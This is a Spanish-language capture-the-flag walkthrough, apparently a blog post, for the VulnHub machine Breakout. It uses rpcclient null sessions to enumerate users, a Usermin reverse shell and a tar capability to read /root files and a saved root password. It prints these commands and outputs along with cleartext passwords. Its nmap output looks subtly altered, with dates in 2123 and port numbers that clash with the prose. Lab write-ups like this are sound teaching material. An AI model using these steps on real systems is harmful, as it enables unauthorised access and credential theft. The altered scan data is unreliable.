---
layout: single
title: ImpereBreakout - VulnHub
excerpt: "Impere-breakout es una máquina vulnerable en VULNHUB. En este escenario, nos enfrentamos a una contraseña ofuscada mediante lenguaje esotérico. Posteriormente, nuestro objetivo es descubrir un usuario correspondiente a la contraseña encontrada. En este proceso, utilizaremos rpcclient para identificar un usuario válido.Después, aprovecharemos la capacidad (capability) cap_dac_read_search para acceder como usuario root."
date: 2023-11-10
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - capability
  - rpcclient
  - lenguajeEsotérico
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)

Impere-breakout es una máquina vulnerable en VULNHUB. En este escenario, nos enfrentamos a una contraseña ofuscada mediante lenguaje esotérico. Posteriormente, nuestro objetivo es descubrir un usuario correspondiente a la contraseña encontrada. En este proceso, utilizaremos rpcclient para identificar un usuario válido.Después, aprovecharemos la capacidad (capability) cap_dac_read_search para acceder como usuario root.


## Enumeracion

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```bash
# Nmap 7.93 scan initiated Mon Nov  6 14:58:16 2123 as: nmap -sCV -p81,139,445,11111,21111 -oN vulnscan.nmap 192.168.56.21
Nmap scan report for 192.168.56.21
Host is up (1.11126s latency).

PORT      STATE SERVICE     VERSION
81/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
11111/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 211 &mdash; Document follows
21111/tcp open  http        MiniServ 1.831 (Webmin httpd)
|_http-title: 211 &mdash; Document follows
MAC Address: 18:11:27:1E:E1:12 (Oracle VirtualBox virtual NIC)

Host script results:
|_clock-skew: -3h11m11s
| smb2-time: 
|   date: 2123-11-16T14:58:27
|_  start_date: N/A
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: 111111111111 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  6 14:58:58 2123 -- 1 IP address (1 host up) scanned in 42.42 seconds
```


## Analisis 

Inicializamos la enumeración por el servicio 80(HTTP).Si nos ubicamos al final de la página, identificaremos una cadena en lenguaje esotérico.


![](/assets/images/vulnhub-writeup-impereBreakout/lenguajeEsoterico.png)

Colocamos la cadena en lenguaje esotérico en una búsqueda en Google para determinar su uso, y así descubrimos que está codificada en Brainfuck.

![](/assets/images/vulnhub-writeup-impereBreakout/BuscarElTipoDeLenguaje.png)

Al decodificar tenemos una cadena de caracteres que aparenta ser una contraseña.

```bash
.2uqPEfj3D<P'a-3
```

Los servicios en los puertos 10000 (HTTPs) y 20000 (HTTPs) son específicamente interfaces de inicio de sesión. Para avanzar, necesitamos encontrar un usuario. Es importante tener en cuenta que ambas páginas web no permiten ataques de fuerza bruta.

### ¿Qué hacer?

Intentamos iniciar sesión en RPC como usuarios nulos y tenemos éxito.

```bash
➜  impere-breakout rpcclient -U%% 192.168.56.21 -c "srvinfo"
	BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
```

En rpcclient, hemos utilizado el parámetro llamado "lookupnames" para identificar usuarios del sistema. Esta acción nos ha proporcionado tanto el SID como el RID asociados al usuario identificado.

```bash
➜  impere-breakout rpcclient -U%% 192.168.56.21 -c "lookupnames root"
root S-1-22-1-0 (User: 1)
➜  impere-breakout rpcclient -U%% 192.168.56.21 -c "lookupnames www-data"
www-data S-1-22-1-33 (User: 1)
```

- El RID es un identificador único representado en hexadecimal para rastrear e identificar objetos.
- El SID consta de una cadena única de números y caracteres que representa de manera exclusiva un objeto de seguridad en un dominio

![](/assets/images/vulnhub-writeup-impereBreakout/SIDRID.png)

Podemos establecer que los SIDs para los usuarios del sistema siguen la estructura "S-1-22-1-RID (Identificador del usuario)". Por lo tanto, planeo realizar un enfoque similar a la fuerza bruta para descubrir la mayoría de los usuarios. Otra opción sería probar con una lista predefinida de usuarios y utilizar la función lookupnames, aunque este método podría requerir más tiempo.

![](/assets/images/vulnhub-writeup-impereBreakout/script-rpcclient-bash.png)

Lo que ejecuta cada función

![](/assets/images/vulnhub-writeup-impereBreakout/expresionesregularesEx.png)

## Shell-Cyber 

Utilizamos el ultimo usuario para iniciar sesión en Usermin

![](/assets/images/vulnhub-writeup-impereBreakout/login-Usermin.png)

Una vez iniciado sesión, nos dirigimos a esta parte para entablar una reverse shell.

![](/assets/images/vulnhub-writeup-impereBreakout/shell.png)

Una vez dentro del sistema, vemos un archivo interesante, llamado TAR. por lo que procedemos a listar sus capabilities.

![](/assets/images/vulnhub-writeup-impereBreakout/getcapTar.png)

Si buscamos la capabilitie en hacktricks vemos lo siguiente.

![](/assets/images/vulnhub-writeup-impereBreakout/gtfsbins.png)

Al parecer tenemos acceso a través del programa TAR, a cual quier archivo del programa por lo que procedo a traer toda la carpeta /root/. 

```bash
cyber@breakout:~/priv$ ../tar -czvf root.tar /root/
../tar: Removing leading `/' from member names
/root/
/root/.tmp/
/root/.spamassassin/
/root/.bash_history
/root/.profile
/root/.bashrc
/root/.usermin/
/root/.usermin/procmail/
/root/.usermin/mailbox/
/root/.usermin/mailbox/dsnreplies.pag
/root/.usermin/mailbox/dsnreplies.dir
/root/.usermin/mailbox/delreplies.dir
/root/.usermin/mailbox/delreplies.pag
/root/.usermin/spam/
/root/.usermin/filter/
/root/rOOt.txt
/root/.local/
/root/.local/share/
/root/.local/share/nano/
```
En el .bash_history vemos algo interesante, al parecer esta depositando la contraseña de root en un archivo.

![](/assets/images/vulnhub-writeup-impereBreakout/history-root.png)

Estamos en lo correcto.

```bash
cyber@breakout:~/priv/var/backups$ cat .old_pass.bak 
Ts&4&YurgtRX(=~h
cyber@breakout:~/priv/var/backups$ 
```
Logrado.

![](/assets/images/vulnhub-writeup-impereBreakout/root-pass.png)
